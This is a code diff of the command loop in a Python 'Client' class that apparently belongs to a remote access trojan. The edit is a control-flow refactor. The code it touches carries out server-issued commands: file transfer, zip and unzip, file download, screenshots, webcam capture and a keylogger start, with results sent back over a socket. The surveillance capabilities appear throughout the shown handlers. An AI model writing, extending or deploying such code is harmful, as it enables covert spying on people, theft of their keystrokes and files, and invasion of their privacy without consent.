@@ -135,9 +135,8 @@ class Client(object):
         except (FileNotFoundError, PermissionError) as error:
             self.esock.send(errors(error).encode(), error='1')
             logging.error('Error receiving %s from Server: %s' % (save_as, errors(error)))
-            return
-
-        logging.info('Transferred %s to Client', save_as)
+        else:
+            logging.info('Transferred %s to Client', save_as)
 
     def receive_commands(self) -> None:
         """ Receives Commands from Server """
@@ -252,9 +251,9 @@ class Client(object):
                 except Exception as err:
                     logging.error('Error zipping file %s into %s: %s' % (data[2], data[1], errors(error)))
                     self.send_json(errors(err))
-                    continue
-                logging.info('Zipped file %s into %s' % (data[2], data[1]))
-                self.send_json(None)
+                else:
+                    logging.info('Zipped file %s into %s' % (data[2], data[1]))
+                    self.send_json(None)
                 continue
 
             if data[0] == 'ZIP_DIR':
@@ -264,9 +263,9 @@ class Client(object):
                 except Exception as error:
                     logging.error('Error zipping directory %s into %s.zip: %s' % (data[2], data[1], errors(error)))
                     self.send_json(errors(error))
-                    continue
-                logging.info('Zipped folder %s into %s.zip' % (data[2], data[1]))
-                self.send_json(None)
+                else:
+                    logging.info('Zipped folder %s into %s.zip' % (data[2], data[1]))
+                    self.send_json(None)
                 continue
 
             if data[0] == 'UNZIP':
@@ -276,17 +275,17 @@ class Client(object):
                 except Exception as error:
                     logging.error('Failed unzipping %s: %s' % (data[1], errors(error)))
                     self.send_json(errors(error))
-                    continue
-                logging.info('Unzipped %s' % data[1])
-                self.send_json(None)
+                else:
+                    logging.info('Unzipped %s' % data[1])
+                    self.send_json(None)
                 continue
 
             if data[0] == 'DOWNLOAD':
                 error = web.download(data[1], data[2])
                 if error:
                     self.send_json(error)
-                    continue
-                self.send_json(None)
+                else:
+                    self.send_json(None)
                 continue
 
             if data[0] == 'INFO':
@@ -298,18 +297,18 @@ class Client(object):
 
             if data[0] == 'SCREENSHOT':
                 success, content = screen.screenshot()
-                if not success:
+                if success:
+                    self.esock.send(content)
+                else:
                     self.esock.send(content, '1')
-                    continue
-                self.esock.send(content)
                 continue
 
             if data[0] == 'WEBCAM':
                 image = webcam.capture_webcam()
-                if not image:
+                if image:
+                    self.esock.send(image)
+                else:
                     self.esock.send(b'ERROR', '1')
-                    continue
-                self.esock.send(image)
                 continue
 
             if data[0] == 'START_KEYLOGGER':
